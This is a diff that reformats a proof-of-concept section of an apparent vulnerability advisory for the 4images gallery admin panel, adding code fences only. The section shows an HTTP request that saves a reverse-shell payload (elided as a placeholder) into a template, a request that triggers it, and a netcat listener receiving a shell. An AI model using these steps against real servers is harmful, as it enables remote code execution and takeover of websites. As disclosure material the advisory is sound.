@@ -13,24 +13,25 @@ To reproduce do the following:
 
 
 // HTTP POST request showing reverse shell payload
-
+```
 POST /4images/admin/templates.php HTTP/1.1
 Host: 127.0.0.1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0
 [...]
 
 __csrf=c39b7dea0ff15442681362d2a583c7a9&action=savetemplate&content=[REVERSE_SHELL_CODE]&template_file_name=categories.html&template_folder=default_960px[...]
-
+```
 
 
 // HTTP redirect response to specific template
-
+```
 GET /4images/categories.php?cat_id=1 HTTP/1.1
 Host: 127.0.0.1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0
 [...]
+```
 
-
+```
 # nc -kvlp 4444
 listening on [any] 4444 ...
 connect to [127.0.0.1] from localhost [127.0.0.1] 43032
@@ -41,7 +42,7 @@ kali     tty7     :0               11:58    2:18m  2:21   0.48s xfce4-session
 kali     pts/1    -                11:58    1:40  24.60s  0.14s sudo su
 uid=1(daemon) gid=1(daemon) groups=1(daemon)
 /bin/sh: 0: can't access tty; job control turned off
-$ 
+```
 
 
 
